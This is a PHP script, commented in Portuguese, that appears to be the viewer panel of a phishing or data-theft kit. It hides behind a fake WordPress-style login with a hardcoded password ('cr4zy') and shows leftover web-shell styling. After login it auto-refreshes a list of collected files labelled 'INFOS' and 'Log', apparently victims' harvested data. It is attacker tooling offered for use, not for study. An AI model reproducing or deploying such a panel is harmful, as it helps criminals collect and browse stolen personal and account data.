<?php
@session_start();
@set_time_limit(0);
error_reporting(0);

//PASSWORD CONFIGURATION
@$pass = $_POST['pass'];
$chk_login = true;
$password = "cr4zy";

//END CONFIGURATION
if($pass == $password)
{
 $_SESSION['nst'] = "$pass";
}

if($chk_login == true)
{
 if(!isset($_SESSION['nst']) or $_SESSION['nst'] != $password)
 {
 die("
<html>
<title> Acesso Restrito </title>
<head>
<meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\">
<title>Private</title>
<link rel=\"stylesheet\" id=\"wp-admin-css\" href=\"media/wp-admin.css\" type=\"text/css\" media=\"all\">
<link rel=\"stylesheet\" id=\"colors-fresh-css\" href=\"media/colors-fresh.css\" type=\"text/css\" media=\"all\">
</head>
<body class=\"login\">
<div id=\"login\">
<form name=\"loginform\" id=\"loginform\" method=\"post\">
<p>
<label for=\"user_pass\">Senha<br>
<input name=\"pass\" id=\"user_pass\" class=\"input\" value=\"\" size=\"20\" tabindex=\"20\" type=\"password\">
</p>
<p class=\"submit\">
<input name=\"wp-submit\" id=\"wp-submit\" class=\"button-primary\" value=\"Login\" tabindex=\"100\" type=\"submit\">
</p>
</form>
</div>
</body>
</html>
  ");
 }
}

$sh_id = "Acesso";
$sh_ver = "Restrito";
$sh_name = $sh_id.$sh_ver;
$sh_mainurl = "";
$html_start = ''.
'<html><head>
<title> '.$sh_name. ' </title>
<style type="text/css">
<!--
body,table { font-family:verdana;font-size:11px;color:white;background-color:black; }
table { width:100%; }
table,td { border:1px solid #808080;margin-top:2;margin-bottom:2;padding:5px; }
a { color:lightblue;text-decoration:none; }
a:active { color:#00FF00; }
a:link { color:#5B5BFF; }
a:hover { text-decoration:underline; }
a:visited { color:#99CCFF; }
input,select,option { font:8pt tahoma;color:#FFFFFF;margin:2;border:1px solid #666666; }
textarea { color:#dedbde;font:fixedsys bold;border:1px solid #666666;margin:2; }
.fleft { float:left;text-align:left; }
.fright { float:right;text-align:right; }
#pagebar { font:10pt tahoma;padding:5px; border:3px solid #1E1E1E; border-collapse:collapse; }
#pagebar td { vertical-align:top; }
#pagebar p { font:8pt tahoma;}
#pagebar a { font-weight:bold;color:#00FF00; }
#pagebar a:visited { color:#00CE00; }
#mainmenu { text-align:center; }
#mainmenu a { text-align: center;padding: 0px 5px 0px 5px; }
#maininfo,.barheader,.barheader2 { text-align:center; }
#maininfo td { padding:3px; }
.barheader { font-weight:bold;padding:5px; }
.barheader2 { padding:5px;border:2px solid #1F1F1F; }
.contents,.explorer { border-collapse:collapse;}
.contents td { vertical-align:top; }
.mainpanel { border-collapse:collapse;padding:5px; }
.barheader,.mainpanel table,td { border:1px solid #333333; }
.mainpanel input,select,option { border:1px solid #333333;margin:0; }
input[type="submit"] { border:1px solid #000000; }
input[type="text"] { padding:3px;}
.shell { background-color:#C0C0C0;color:#000080;padding:5px; }
.yxerrmsg { color:red; font-weight:bold; }
#pagebar,#pagebar p,h1,h2,h3,h4,form { margin:0; }
#pagebar,.mainpanel,input[type="submit"] { background-color:#4A4A4A; }
.barheader2,input,select,option,input[type="submit"]:hover { background-color:#333333; }
textarea,.mainpanel input,select,option { background-color:#000000; }
// -->
</style>
</head>
<body>
';
?>


<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title> Infos </title>

<link rel="stylesheet" id="wp-admin-css" href="media/wp-admin.css" type="text/css" media="all">
<link rel="stylesheet" id="colors-fresh-css" href="media/colors-fresh.css" type="text/css" media="all">
<meta http-equiv="refresh" content="30;url=visualizar.php" >
<style type="text/css">
#texto {font-size: 14px; font-family:Arial, Helvetica, sans-serif; color:#666}
#div{margin:10px; background-color:#ECEBEB;; border:1px solid #ECEBEB;padding: 10px 10px 0px 10px; width:700px}
#div2{margin:10px; background-color:#fff; border:1px solid #ECEBEB; padding: 10px 10px 0px 10px;width:700px}
</style>
</head>

<body>
<div id="div">
<h1 id="texto"> TOTAL DE 

<?php 
$pasta = getcwd(); 
$handle = opendir($pasta);
$files = 0;
while (false !== ($file = readdir($handle)))
{
if ($file != "." && $file != ".." && $file != "index.php" && $file != "visualizar.php" && $file != ".htaccess" && !(is_dir($pasta . $file))) {
  $files++;
}
}
echo $files -1 . ' INFOS';
closedir($handle);
?> - <input class="button-primary" id="wp-submit" type="submit" value="Recarregar p&aacute;gina" onclick="javascript: location.reload();">
<hr>
</h1></div>
<div id="div2">
<?php
// pega o endere�o do diret�rio
$diretorio = getcwd(); 
// abre o diret�rio
$ponteiro  = opendir($diretorio);
// monta os vetores com os itens encontrados na pasta
while ($nome_itens = readdir($ponteiro)) {
    $itens[] = $nome_itens;
}

// ordena o vetor de itens
sort($itens);
// percorre o vetor para fazer a separacao entre arquivos e pastas 
foreach ($itens as $listar) {
// retira "./" e "../" para que retorne apenas pastas e arquivos
   if ($listar!="." && $listar!=".." && $listar!="visualizar.php" && $listar != "index.php" && $listar!= ".htaccess"){ 

// checa se o tipo de arquivo encontrado � uma pasta
   		if (is_dir($listar)) { 
// caso VERDADEIRO adiciona o item � vari�vel de pastas
			$pastas[]=$listar; 
		} else{ 
// caso FALSO adiciona o item � vari�vel de arquivos
			$arquivos[]=$listar;
		}
   }
}

// lista as pastas se houverem
//if ($pastas != "" ) { 
//foreach($pastas as $listar){
//   print "Pasta: <a href='$listar'>$listar</a><br>";}
//   }
// lista os arquivos se houverem
if ($arquivos != "") {
foreach($arquivos as $listar){
   print "Log: <a href='$listar' target='_blank'>$listar</a><br>";}
}

?>
<hr>
</div>
</body>
</html>
